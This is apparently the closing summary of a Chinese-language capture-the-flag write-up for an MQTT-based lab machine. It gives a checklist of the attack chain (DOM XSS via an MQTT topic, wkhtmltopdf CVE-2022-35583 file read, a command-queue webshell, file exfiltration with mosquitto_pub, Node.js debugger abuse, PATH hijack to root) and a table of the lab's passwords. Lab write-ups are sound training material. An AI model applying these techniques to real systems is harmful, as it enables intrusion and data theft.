- [ ] MQTT `data` 主题 + `innerHTML` → DOM XSS
- [ ] 盲打管理员，外带 dashboard 源码，拿到 admin MQTT 凭据
- [ ] `/records?download=true&file=` → `basename()` 拦截
- [ ] PDF 元数据 → `wkhtmltopdf 0.12.6.1` → CVE-2022-35583
- [ ] `record` 主题 `chart` 字段闭合 → `file://` 读源码
- [ ] `server.php` + `server/command/new` 异步命令队列 → webshell
- [ ] `doas` + `mosquitto_pub -f` 外带文件
- [ ] `nano` 历史记录 → passphrase；GPG → `lenam` 密码
- [ ] `doas kill` → Node.js `SIGUSR1` → 9229 → `julian`
- [ ] `backups` + `libbackup.so` 相对路径 `rm` + `setenv { PATH }` → root

### 11.4 关键凭据速查

| 身份 / 用途                       | 凭据                                  |
| --------------------------------- | ------------------------------------- |
| MQTT 普通用户                     | `user` / `1tEa15klQpTx9Oub6ENG`       |
| MQTT 管理员                       | `admin` / `tJH8HvwVwC57BR6CEyg5`      |
| `server.php` / MQTT               | `5up3r` / `bloods`                    |
| MySQL（`login.php` 内）           | `solar_user` / `lD5vkvLfMowAiaT7w64C` |
| `user.txt` 字符串                 | `c25e7b68dd71d1ca9d8f86da2df12035`    |
| SSH / `private_id.gpg` passphrase | `CzMO48xpwof8nvQ6JUhF`                |
| GPG passphrase                    | `loveboy1`                            |
| `lenam` 密码                      | `qiFQI7buDp7zIQnAymEY`                |
| `julian` 密码                     | `tk8QaHUi3XaMLYoP1BpZ`                |

### 11.5 关键 Topic 速查

| Topic                   | 作用                                                           |
| ----------------------- | -------------------------------------------------------------- |
| `data`                  | 设备/后端发布 JSON，前端订阅并写入 `innerHTML`；DOM XSS 注入点 |
| `record`                | 前端发布图表数据；后端保存为 JSON，下载 PDF 时渲染 `chart`     |
| `server/command/output` | `server.php` 执行命令后发布结果                                |
| `server/command/new`    | MQTT 输入端，用于生成 `commands/` 下的命令文件                 |
| `test`                  | 用 `mosquitto_pub -f` 外带文件时使用的主题                     |

### 11.6 主线总结

> 这条链的核心不是单个漏洞，而是“**凭据复用 + 信任边界**”：Web 源码泄露 MQTT 凭据 → MQTT 数据被前端信任 → 管理员浏览器被 XSS → PDF 生成器信任 HTML → 后台命令队列信任 MQTT 消息 → `doas` 配置信任环境变量。每一跳都在把上一跳的权限或数据，交给下一跳继续利用。
